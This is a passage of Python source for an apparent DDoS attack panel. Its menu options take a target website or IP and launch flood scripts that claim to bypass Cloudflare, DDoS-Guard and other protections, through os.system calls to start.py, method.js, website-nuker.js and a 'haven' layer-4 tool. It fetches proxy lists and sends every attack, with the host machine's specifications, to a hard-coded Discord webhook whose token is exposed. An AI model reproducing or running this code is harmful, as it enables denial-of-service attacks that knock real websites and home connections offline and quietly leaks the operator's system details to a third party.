                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(mhgetsend)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embedx.add_embed_field(name='Method:', value='mh-ddosguard')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()
                load()
                license()
                menu()
            if kies == "mh-cfbypass":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-cfbypass \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass CLOUDFLARE \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py cfb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embed.add_embed_field(name='Method:', value='mh-cfbypass')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(mhgetsend)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embedx.add_embed_field(name='Method:', value='mh-cfbypass')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()
                load()
                license()
                menu()
            if kies == "mh-null":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-null \033[31m: \033[36m Powerfull Layer 7 Attack: NULL \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py null ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embed.add_embed_field(name='Method:', value='mh-null')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(mhgetsend)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embedx.add_embed_field(name='Method:', value='mh-null')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()
                load()
                license()
                menu()
            if kies == "mh-normalbypass":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-normalbypass \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass normal anti ddos \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py bypass ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embed.add_embed_field(name='Method:', value='mh-normalbypass')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(mhgetsend)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embedx.add_embed_field(name='Method:', value='mh-normalbypass')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()
                load()
                license()
                menu()
            if kies == "update":
                os.system('sudo rm -r darkness')
                update()
            if kies == "haven-god":
                os.system('clear')
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mhaven-god \033[31m: \033[36m Verry strong Layer 4 attack for websites, servers and home ips \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                havenip = input("\033[31m\033[1m⮞ \033[0m\033[96mIP\033[31m:\033[36m\033[31m")
                havensend = ('sudo ./haven -d ' + havenip)
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{havenip}')
                    
                embed.add_embed_field(name='Method:', value='haven-god')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(havensend)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{havenip}')
                    
                embedx.add_embed_field(name='Method:', value='haven-god')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()
                load()
                license()
                menu()
            
            if kies == "proxy-crawl":
                os.system('clear')
                load()
                print("""
\033[36m[\033[39mTOOLS.x\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[96mproxy-crawl \033[31m: \033[36m crawl proxies\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                os.system('sudo rm -r proxies.txt')
                crawlPROXYHTTP = r.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=7000")
                textPROXIES = (crawlPROXYHTTP.text)
                with open('proxies.txt', 'x') as file:
                    file.write(str(textPROXIES))
                    file.write('\n')
                    print(indicatorlogo + "Proxies saved in = proxies.txt\n\n")
                    gobackMENU = input(indicatorlogo + "Go back to menu (y/n):")
                    if gobackMENU == "n":
                        sys.exit()
                    else:
                        load()
                        license()
                        menu()
            
            if kies == "ultra-bypass":
                os.system('clear')
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39multra-bypass \033[31m: \033[36m Bypasses Blazingfast, DDOS Guard, (js) StormWall , OVH UAM & Cloudflare UAM & Also normal hit could be done \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                ultrabypasswebsite = input("\033[31m\033[1m⮞ \033[0m\033[96mWEBSITE (https://google.com) \033[31m:\033[36m\033[31m")
                ultrabypasstime = input("\033[31m\033[1m⮞ \033[0m\033[96mTIME(seconds) \033[31m:\033[36m\033[31m")
                couldbeslow = input("\033[31m\033[1m⮞ \033[0m\033[96mAttack could be slow. But when it starts hitting it destroys nearly everything!\033[31m:\033[36m\033[31m")
                ultrabypassREQ = input("\033[31m\033[1m⮞\033[0m \033[96mThreads-Requests (minimum 5) and write it only in numbers without spaces \033[31m:\033[36m\033[31m")
                sendultrabypassattack = ("node method.js " + ultrabypasswebsite + " " + ultrabypasstime + " request " + ultrabypassREQ)
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{ultrabypasswebsite}')
                    
                embed.add_embed_field(name='Time:', value=f'{ultrabypasstime}')
                    
                embed.add_embed_field(name='Threads:', value=f'{ultrabypassREQ}')
                embed.add_embed_field(name='Method:', value='ultra-bypass')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(sendultrabypassattack)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{ultrabypasswebsite}')
                embedx.add_embed_field(name='Time:', value=f'{ultrabypasstime}')
                    
                embedx.add_embed_field(name='Threads:', value=f'{ultrabypassREQ}')
                embedx.add_embed_field(name='Method:', value='ultra-bypass')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='Method:', value='ultra-bypass')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()

                load()
                license()
                menu()
            if kies == "nuker-proxyless":
                os.system('clear')
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[96mwebsite-nuker-https \033[31m: \033[36m Bypasses Anti DDOS Tunnels [CF], Destroys Target Verry Fast. Also Non CF. [HTTPS]\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                websitenukerwebsite = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite (https://google.com)\033[31m:\033[36m\033[31m")
                timewebsitenuker = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                sendattackwebsitenuker = ("node website-nuker.js " + websitenukerwebsite + " " + timewebsitenuker)
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{websitenukerwebsite}')
                    
                embed.add_embed_field(name='Time:', value=f'{timewebsitenuker}')
                embed.add_embed_field(name='Method:', value='nuker-proxyless')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(sendattackwebsitenuker)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{websitenukerwebsite}')
                    
                embedx.add_embed_field(name='Time:', value=f'{timewebsitenuker}')
                embedx.add_embed_field(name='Method:', value='nuker-proxyless')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
